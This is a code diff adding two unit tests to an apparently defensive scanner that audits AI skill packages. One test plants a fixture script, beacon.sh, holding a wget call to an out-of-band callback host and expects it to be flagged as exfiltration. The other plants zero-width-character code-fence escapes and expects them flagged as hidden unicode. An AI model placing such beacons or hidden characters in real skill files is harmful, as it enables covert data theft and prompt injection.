@@ -102,6 +102,25 @@ class AuditRules(unittest.TestCase):
         found = {(f["file"], f["severity"]) for f in _audit.audit(d)["findings"] if f["rule"] == "injection"}
         self.assertEqual(found, {("SKILL.md", "medium"), ("reference.md", "low")})
 
+    def test_endpoint_rule_needs_word_boundaries(self):
+        d = self.tmp / "toasty"
+        shutil.copytree(self.tmp / "clean", d)
+        (d / "SKILL.md").write_text((d / "SKILL.md").read_text()
+                                    + "Show progress with `toast.promise(save())` and `toast.success('Saved')`.\n")
+        self.assertNotIn("exfil-endpoint", rules(_audit.audit(d)))
+        (d / "scripts" / "beacon.sh").write_text("#!/bin/sh\nwget -q https://abc.oast.pro/x\n")
+        self.assertIn("exfil-endpoint", rules(_audit.audit(d), "high"))
+
+    def test_zero_width_fence_escape_is_low_only_outside_skill_md(self):
+        d = self.tmp / "template"
+        shutil.copytree(self.tmp / "clean", d)
+        escaped = "\u200b```js\nconsole.log(1)\n\u200b```\n"
+        (d / "PLAN-TEMPLATE.md").write_text("# Plan\n```markdown\n" + escaped + "```\n")
+        sev = {f["severity"] for f in _audit.audit(d)["findings"] if f["rule"] == "hidden-unicode"}
+        self.assertEqual(sev, {"low"})
+        (d / "SKILL.md").write_text((d / "SKILL.md").read_text() + escaped)
+        self.assertIn("hidden-unicode", rules(_audit.audit(d), "high"))
+
     def test_symlink_outside_is_high(self):
         d = self.tmp / "linky"
         shutil.copytree(self.tmp / "clean", d)
